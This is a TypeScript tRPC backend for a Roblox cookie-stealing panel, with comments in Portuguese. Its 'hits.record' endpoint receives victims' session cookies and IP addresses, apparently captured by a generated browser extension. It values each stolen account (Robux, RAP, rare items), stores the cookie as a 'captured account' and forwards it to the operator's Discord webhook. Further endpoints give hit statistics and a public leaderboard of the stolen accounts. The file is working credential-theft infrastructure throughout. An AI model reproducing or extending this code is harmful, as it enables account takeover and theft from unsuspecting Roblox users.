import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { z } from "zod";
import * as db from "./db";
import { TRPCError } from "@trpc/server";
import { extensionRouter } from "./routers-extension";
import { getRobloxUserInfo, formatDiscordEmbed, getRobloxAccountDetails, formatDiscordEmbedComplete } from "./roblox";
import axios from "axios";

// Middleware para validar webhook
const webhookProcedure = publicProcedure.use(async ({ ctx, next }) => {
  const webhookUrl = ctx.req.headers["x-webhook-url"] as string | undefined;
  
  if (!webhookUrl) {
    throw new TRPCError({ code: "UNAUTHORIZED", message: "Webhook URL required" });
  }
  
  return next({
    ctx: {
      ...ctx,
      webhookUrl,
    },
  });
});

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // Configuration management
  config: router({
    save: protectedProcedure
      .input(z.object({
        webhookUrl: z.string().url(),
        panelUrl: z.string().url().optional(),
        extensionTitle: z.string().optional(),
        extensionDescription: z.string().optional(),
        extensionBackground: z.string().optional(),
        extensionPrimaryColor: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await db.saveConfig({
          userId: ctx.user.id,
          webhookUrl: input.webhookUrl,
          panelUrl: input.panelUrl,
          extensionTitle: input.extensionTitle,
          extensionDescription: input.extensionDescription,
          extensionBackground: input.extensionBackground,
          extensionPrimaryColor: input.extensionPrimaryColor,
        });
        return { success: true };
      }),
    
    get: protectedProcedure.query(async ({ ctx }) => {
      return await db.getConfigByUserId(ctx.user.id);
    }),
  }),

  // Hits tracking (webhook based)
  hits: router({
    record: webhookProcedure
      .input(z.object({
        eventType: z.enum(["cookie_capture", "login_attempt", "extension_open", "click"]),
        cookie: z.string().optional(),
        userAgent: z.string().optional(),
        ipAddress: z.string().optional(),
        metadata: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await db.createHit({
          ...input,
          userId: undefined, // Will be set from webhook later
          timestamp: new Date(),
        });
        
        // If it's a cookie capture, also save to captured accounts
        if (input.eventType === "cookie_capture" && input.cookie) {
          // Enviar para o Webhook do Discord com formatação bonita
          try {
            const accountDetails = await getRobloxAccountDetails(input.cookie);
            if (accountDetails) {
              // Salvar com detalhes completos
              await db.createCapturedAccount({
                cookie: input.cookie,
                capturedAt: new Date(),
                isValid: true,
                robux: accountDetails.robuxBalance,
                rap: accountDetails.totalRAP,
                summary: accountDetails.summaryValue,
                hasKorblox: accountDetails.hasKorblox,
                hasHeadless: accountDetails.hasHeadless,
                metadata: JSON.stringify({
                  username: accountDetails.username,
                  displayName: accountDetails.displayName,
                  userId: accountDetails.userId,
                  thumbnailUrl: accountDetails.thumbnailUrl
                }),
                userId: undefined,
              });

              const discordPayload = formatDiscordEmbedComplete(accountDetails, input.ipAddress);
              await axios.post(ctx.webhookUrl, discordPayload);
            } else {
              await db.createCapturedAccount({
                cookie: input.cookie,
                capturedAt: new Date(),
                isValid: true,
                metadata: input.metadata,
                userId: undefined,
              });
              // Fallback se a API do Roblox falhar
              await axios.post(ctx.webhookUrl, {
                content: `🚨 **Novo Hit Capturado!**\nCookie: \`${input.cookie.substring(0, 50)}...\`\nIP: \`${input.ipAddress || "N/A"}\``
              });
            }
          } catch (webhookError) {
            console.error("Erro ao enviar para o Discord Webhook:", webhookError);
          }
        } else if (ctx.webhookUrl) {
          // Notificar outros tipos de eventos se o webhook estiver configurado
          try {
            await axios.post(ctx.webhookUrl, {
              content: `🔔 **Novo Evento:** \`${input.eventType}\`\nIP: \`${input.ipAddress || "N/A"}\``
            });
          } catch (e) {}
        }
        
        return { success: true };
      }),
    
    list: protectedProcedure
      .input(z.object({
        limit: z.number().optional().default(100),
      }))
      .query(async ({ input }) => {
        return await db.getRecentHits(input.limit);
      }),
    
    byDateRange: protectedProcedure
      .input(z.object({
        startDate: z.date(),
        endDate: z.date(),
      }))
      .query(async ({ input }) => {
        return await db.getHitsByDateRange(input.startDate, input.endDate);
      }),
    
    byEventType: protectedProcedure
      .input(z.object({
        eventType: z.string(),
      }))
      .query(async ({ input }) => {
        return await db.getHitsByEventType(input.eventType);
      }),
  }),

  // Statistics
  stats: router({
    overview: protectedProcedure.query(async () => {
      const [totalHits, totalAccounts, hitsByType, hitsByDate] = await Promise.all([
        db.getTotalHitsCount(),
        db.getTotalCapturedAccountsCount(),
        db.getHitsCountByType(),
        db.getHitsCountByDate(7),
      ]);
      
      return {
        totalHits,
        totalAccounts,
        hitsByType,
        hitsByDate,
      };
    }),
    
    hitsByDate: protectedProcedure
      .input(z.object({
        days: z.number().optional().default(7),
      }))
      .query(async ({ input }) => {
        return await db.getHitsCountByDate(input.days);
      }),
  }),

  // Captured accounts
  accounts: router({
    getRecentCapturedAccounts: protectedProcedure
      .input(z.object({ limit: z.number().optional() }))
      .query(async ({ input }) => {
        return await db.getRecentCapturedAccounts(input.limit);
      }),

    getTopGlobal: publicProcedure
      .query(async () => {
        return await db.getTopGlobal(20);
      }),
  }),

  // Extension generation
  extension: extensionRouter,
});

export type AppRouter = typeof appRouter;
